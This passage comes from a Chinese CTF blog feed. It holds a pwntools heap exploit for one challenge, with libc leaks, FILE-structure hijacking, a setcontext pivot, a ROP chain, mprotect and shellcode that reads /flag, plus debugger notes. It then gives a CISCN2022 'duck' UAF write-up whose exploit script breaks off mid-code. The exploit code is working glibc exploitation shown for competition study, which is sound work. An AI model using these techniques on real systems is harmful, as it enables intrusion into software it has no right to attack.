class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.32/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %self/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdbscript += <span class="hljs-string">&#x27;b *_IO_wdoallocbuf\n&#x27;</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn2&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br><span class="hljs-comment"># p = process(&#x27;./pwn2&#x27;)</span><br><span class="hljs-comment"># debug()</span><br>p = remote(<span class="hljs-string">&#x27;tcp.dasc.buuoj.cn&#x27;</span>,<span class="hljs-number">23606</span>)<br><br>sla(<span class="hljs-string">&quot;Your name: &quot;</span>,<span class="hljs-string">&#x27;u&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">c</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-built_in">str</span>(c))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mage</span>(<span class="hljs-params">trick</span>):<br>    menu(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&quot;What&#x27;s your trick?&quot;</span>,<span class="hljs-built_in">str</span>(trick))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">servant</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,name,info</span>):<br>    menu(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&quot;Recruit Servant for which Mage?&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    sla(<span class="hljs-string">&quot;Servant name: &quot;</span>,<span class="hljs-built_in">str</span>(name))<br>    sla(<span class="hljs-string">&quot;Servant info: &quot;</span>,<span class="hljs-built_in">str</span>(info))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,magic=<span class="hljs-string">&#x27;n&#x27;</span></span>):<br>    menu(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Which Mage?&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    sla(<span class="hljs-string">&#x27;Offer by one?&#x27;</span>,magic)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Which Mage?&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    <span class="hljs-comment"># if magic == &#x27;y&#x27;:</span><br>    <span class="hljs-comment">#     se(&#x27;u&#x27;)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>(<span class="hljs-params">mage=<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-built_in">id</span>=<span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-built_in">chr</span>=<span class="hljs-string">&#x27;u&#x27;</span></span>):<br>    menu(<span class="hljs-string">&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">&quot;Would you like to select a Mage to attack ?&quot;</span>,mage)<br>    <span class="hljs-keyword">if</span> mage == <span class="hljs-string">&#x27;y&#x27;</span>:<br>        sla(<span class="hljs-string">&quot;Which Mage ?&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><br>mage(<span class="hljs-string">&quot;fuck0&quot;</span>.ljust(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+p64(<span class="hljs-number">0x51</span>)+<span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">8</span>)<br>servant(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;nmsl&#x27;</span>,<span class="hljs-string">&#x27;wsnd&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">0x11</span>):<br>    mage(<span class="hljs-string">&quot;fuck&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(i))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    attack(<span class="hljs-string">&#x27;y&#x27;</span>,<span class="hljs-number">10</span>-<span class="hljs-number">1</span>-i)<br><br>attack(<span class="hljs-string">&#x27;y&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>dele(<span class="hljs-number">2</span>)<br>dele(<span class="hljs-number">1</span>)<br>ru(<span class="hljs-string">&#x27;Expel Mage, whose trick is: &#x27;</span>)<br>heap_leak = uu64(rc(<span class="hljs-number">5</span>))<br>heap_base = heap_leak &lt;&lt; <span class="hljs-number">12</span><br>lg(<span class="hljs-string">&#x27;heap_leak&#x27;</span>,heap_leak)<br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>,heap_base)<br><br>mage(p64(heap_leak^(heap_base+<span class="hljs-number">0x2b0</span>))) <span class="hljs-comment"># 0x11</span><br>mage(<span class="hljs-string">&#x27;fuckx12&#x27;</span>) <span class="hljs-comment"># 0x12</span><br>mage(<span class="hljs-string">&#x27;fuckx13&#x27;</span>) <span class="hljs-comment"># 0x13</span><br><br>dele(<span class="hljs-number">0</span>)<br>mage(<span class="hljs-string">&quot;fuckx14&quot;</span>.ljust(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+p64(<span class="hljs-number">0x51</span>)+p64(heap_leak)) <span class="hljs-comment"># 0x14</span><br><br><br>menu(<span class="hljs-string">&#x27;1&#x27;</span>)<br>sea(<span class="hljs-string">&quot;What&#x27;s your trick?&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-string">&#x27;\x01&#x27;</span>*<span class="hljs-number">0x28</span>+p32(<span class="hljs-number">0x21</span>)+<span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">3</span>)) <span class="hljs-comment"># 0x15</span><br><br><span class="hljs-comment"># attack(&#x27;n&#x27;,&#x27;1&#x27;)</span><br>dele(<span class="hljs-number">0x14</span>)<br>mage(<span class="hljs-string">&quot;fuckx16&quot;</span>.ljust(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+p64(<span class="hljs-number">0x461</span>)+p64(heap_leak)) <span class="hljs-comment"># 0x16</span><br><span class="hljs-comment"># attack(&#x27;y&#x27;,0xf)</span><br><br>dele(<span class="hljs-number">0x15</span>)<br><br>mage(<span class="hljs-string">&quot;fuckx17&quot;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+p32(<span class="hljs-number">0x7fffff01</span>)+p32(<span class="hljs-number">0x123456</span>)+p64(heap_base+<span class="hljs-number">0x2c0</span>)) <span class="hljs-comment"># 0x17</span><br><br>dele(<span class="hljs-number">0x1</span>,<span class="hljs-string">&#x27;y&#x27;</span>)<br>libc_leak = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>libc_base = libc_leak - <span class="hljs-number">0x1e0c0a</span>    <br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br><span class="hljs-comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span><br>libc = elf.libc<br>libc.address = libc_base<br>system_addr = libc.sym.system<br>bin_sh = libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()<br>magic = libc.sym.setcontext + <span class="hljs-number">61</span><br>_IO_wfile_jumps = libc_base + <span class="hljs-number">0x1e1f60</span><br>stderr = libc_base + <span class="hljs-number">0x1e17a0</span><br><span class="hljs-comment">#  x/20xg 0x555555606600</span><br>delete(<span class="hljs-number">0xa</span>)<br>mage((<span class="hljs-string">&quot;fuckx18\0&quot;</span>+p64(heap_base+<span class="hljs-number">0x200</span>)).ljust(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+p64(heap_base+<span class="hljs-number">0x690</span>)) <span class="hljs-comment"># 0x18</span><br>delete(<span class="hljs-number">0xb</span>)<br>mage(p64(<span class="hljs-number">0</span>)+p64(_IO_wfile_jumps-<span class="hljs-number">0x20</span>)) <span class="hljs-comment"># 0x19</span><br>rdi = <span class="hljs-number">0x0000000000028a55</span> + libc_base<br>ret = <span class="hljs-number">0x0000000000026699</span> + libc_base<br>rsi = <span class="hljs-number">0x000000000002a4cf</span> + libc_base<br>rdx = <span class="hljs-number">0x00000000000c7f32</span> + libc_base<br>delete(<span class="hljs-number">0xd</span>)<br>mage(p64(rdi)+p64(heap_base+<span class="hljs-number">0x6d0</span>)+p64(libc.sym.gets)) <span class="hljs-comment"># 0x19</span><br><br><br>delete(<span class="hljs-number">0xe</span>)<br>mage(p64(<span class="hljs-number">0</span>)+p64(libc.sym.gets)+p64(heap_base+<span class="hljs-number">0x6d0</span>)+p64(ret)) <span class="hljs-comment"># 0x19</span><br>delete(<span class="hljs-number">0xf</span>)<br>mage(p64(heap_base+<span class="hljs-number">0x778</span>-<span class="hljs-number">0x68</span>)+p64(magic)) <span class="hljs-comment"># 0x19</span><br><br>menu(<span class="hljs-string">&#x27;4&#x27;</span>)<br>sea(<span class="hljs-string">&#x27;LEAVE MY NAME: &#x27;</span>,p64(heap_base+<span class="hljs-number">0x100</span>))<br>sea(<span class="hljs-string">&#x27;WRITE YOUR NAME: &#x27;</span>,p64(stderr))<br><span class="hljs-comment"># pause()</span><br>se(p64(heap_base+<span class="hljs-number">0x600</span>-<span class="hljs-number">0xa0</span>))<br><br>rop_chain = p64(heap_base+<span class="hljs-number">0x300</span>)<br>rop_chain += <span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span><br>rop_chain += p64(rdi) + p64(heap_base) + p64(rsi) + p64(<span class="hljs-number">0x2000</span>) + p64(rdx) + p64(<span class="hljs-number">7</span>) + p64(libc.sym.mprotect) + p64(heap_base+<span class="hljs-number">0x728</span>)<br>rop_chain += asm(shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>)+shellcraft.exit(<span class="hljs-number">0</span>))<br>sleep(<span class="hljs-number">3</span>)<br>sl(rop_chain)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string"> 0x7ffff7e30d91 &lt;perror_internal+81&gt;     lea    rsi, [rip + 0x14f54f]</span><br><span class="hljs-string">   0x7ffff7e30d98 &lt;perror_internal+88&gt;     xor    eax, eax</span><br><span class="hljs-string"> ► 0x7ffff7e30d9a &lt;perror_internal+90&gt;     call   __fxprintf                &lt;__fxprintf&gt;</span><br><span class="hljs-string">        rdi: 0x555555606560 ◂— 0x0</span><br><span class="hljs-string">        rsi: 0x7ffff7f802e7 ◂— 0xa732573257325 /* &#x27;%s%s%s\n&#x27; */</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"> 0x7ffff7e453f6 &lt;__vfprintf_internal+262&gt;    mov    rsi, qword ptr [rsp + 8]</span><br><span class="hljs-string">   0x7ffff7e453fb &lt;__vfprintf_internal+267&gt;    mov    rdx, rbx</span><br><span class="hljs-string">   0x7ffff7e453fe &lt;__vfprintf_internal+270&gt;    mov    rdi, rbp</span><br><span class="hljs-string"> ► 0x7ffff7e45401 &lt;__vfprintf_internal+273&gt;    call   qword ptr [r12 + 0x38]        &lt;_IO_wfile_xsputn&gt;</span><br><span class="hljs-string">        rdi: 0x555555606560 ◂— 0x0</span><br><span class="hljs-string">        rsi: 0x7ffff7f802e7 ◂— 0xa732573257325 /* &#x27;%s%s%s\n&#x27; */</span><br><span class="hljs-string">        rdx: 0x0</span><br><span class="hljs-string">        rcx: 0xd68</span><br><span class="hljs-string"> 0x7ffff7e54a52 &lt;_IO_wdoallocbuf+34&gt;    jne    _IO_wdoallocbuf+152                &lt;_IO_wdoallocbuf+152&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">   0x7ffff7e54a54 &lt;_IO_wdoallocbuf+36&gt;    mov    rax, qword ptr [rax + 0xe0]</span><br><span class="hljs-string"> ► 0x7ffff7e54a5b &lt;_IO_wdoallocbuf+43&gt;    call   qword ptr [rax + 0x68]</span><br><span class="hljs-string"></span><br><span class="hljs-string">   0x7ffff7e54a5e &lt;_IO_wdoallocbuf+46&gt;    cmp    eax, -1</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">0x0000000000028a55 : pop rdi ; ret</span><br><span class="hljs-string">0x0000000000112a51 : pop rdx ; pop r12 ; ret</span><br><span class="hljs-string">0x00000000001574e6 : pop rdx ; pop rbx ; ret</span><br><span class="hljs-string">0x00000000000fc103 : pop rdx ; pop rcx ; pop rbx ; ret</span><br><span class="hljs-string">0x00000000000c7f32 : pop rdx ; ret</span><br><span class="hljs-string">0x0000000000095982 : pop rdx ; ret 0x11</span><br><span class="hljs-string">0x0000000000093342 : pop rdx ; ret 0xfffc</span><br><span class="hljs-string">0x0000000000028db0 : pop rsi ; pop r15 ; pop rbp ; ret</span><br><span class="hljs-string">0x0000000000028a53 : pop rsi ; pop r15 ; ret</span><br><span class="hljs-string">0x000000000002a4cf : pop rsi ; ret</span><br><span class="hljs-string">0x0000000000028dac : pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret</span><br><span class="hljs-string">0x0000000000028a4f : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="hljs-string">0x000000000002a4cb : pop rsp ; pop r13 ; pop r14 ; ret</span><br><span class="hljs-string">0x0000000000043922 : pop rsp ; pop r13 ; pop rbp ; ret</span><br><span class="hljs-string">0x000000000002a04c : pop rsp ; pop r13 ; ret</span><br><span class="hljs-string">0x00000000000de0e6 : pop rsp ; pop rbp ; ret</span><br><span class="hljs-string">0x0000000000033af2 : pop rsp ; ret</span><br><span class="hljs-string">0x0000000000026699 : ret</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># dele(0xf)</span><br><br><span class="hljs-comment"># menu(5)</span><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CISCN2022 华东北赛区 Pwn Writeup</title>
    <link href="/posts/2c3848ae.html"/>
    <url>/posts/2c3848ae.html</url>
    
    <content type="html"><![CDATA[<p>Pwn 难度不大，草草地ak了，最后也是擦边进了决赛，还是比较有惊无险的。<s>但是👴大雾好像要🐔了，👴下去好好反思反思。</s>（然而没有）另外这小可爱比赛Pwn全做了算上前三的加成👴也就1200+30+30+60，感觉不如隔壁取证一题1200+360。</p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220624170308020.png" alt="image-20220624170308020" style="zoom: 50%;" /><h2 id="duck"><a class="header-anchor" href="#duck">¶</a>duck</h2><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220619194732802.png" alt="image-20220619194732802"></p><p><strong>flag{693edf4763ef4cdd4f152794028b7f5e}</strong></p><p>libc 2.34 下的 pwn 题，给的漏洞比较基础就是 <strong>UAF</strong>，同时给了 Edit 功能，我们可以很简单的 getshell。</p><p><strong>思路</strong></p><ol><li>利用 UAF leak 堆地址，分配并 Dele 掉多个堆块 leak libc</li><li>分配 chunk 到 Tcache 的 entry 处，利用 Edit 函数我们可以控制任意分配堆块</li><li>修改掉 stderr 的 flag 为 <code>/bin/sh\0</code></li><li>修改掉 <code>_IO_file_jumps</code> 里的函数指针为 <code>system</code> ，最后改掉 Top Chunk 的 size 进入 <code>_IO_fflush</code> 触发 getshell。</li></ol><p><strong>Exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br><span class="hljs-comment"># p = process(&#x27;./pwn&#x27;)</span><br><span class="hljs-comment"># debug()</span><br>p = remote(<span class="hljs-string">&#x27;192.168.166.147&#x27;</span>,<span class="hljs-number">58013</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">c</span>):<br>    sla(<span class="hljs-string">&#x27;Choice: &#x27;</span>,<span class="hljs-built_in">str</span>(c))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():<br>    menu(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&#x27;Idx: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">3</span>)<br>    sla(<span class="hljs-string">&#x27;Idx: \n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,data,size=<span class="hljs-number">0x100</span></span>):<br>    menu(<span class="hljs-number">4</span>)<br>    sla(<span class="hljs-string">&#x27;Idx: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    sla(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sea(<span class="hljs-string">&#x27;Content: &#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><br>add()<br>dele(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>heap_leak = uu64(ru(<span class="hljs-string">&#x27;\n&#x27;</span>))<br>heap_base = heap_leak &lt;&lt;<span class="hljs-number">12</span><br>lg(<span class="hljs-string">&#x27;heap_leak&#x27;</span>,heap_leak)<br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>,heap_base)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    add() <span class="hljs-comment"># 9</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>+<span class="hljs-number">8</span>):<br>    dele(i)<br>show(<span class="hljs-number">8</span>)<br>libc_leak = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span 